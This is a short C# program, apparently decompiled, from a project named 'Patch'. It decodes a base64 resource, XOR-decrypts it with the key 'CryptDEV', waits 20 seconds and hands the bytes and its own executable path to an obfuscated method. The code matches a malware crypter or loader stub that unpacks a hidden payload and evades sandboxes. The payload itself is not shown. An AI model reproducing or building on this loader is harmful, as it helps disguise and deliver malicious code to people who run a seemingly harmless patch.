using System;
using System.Diagnostics;
using System.Threading;
using Patch.Properties;

namespace Patch;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		byte[] bytes = XOR.XorDecrypt(Convert.FromBase64String(Resources.String1), "CryptDEV");
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		Thread.Sleep(20000);
		GClass0.smethod_1(bytes, fileName);
	}
}
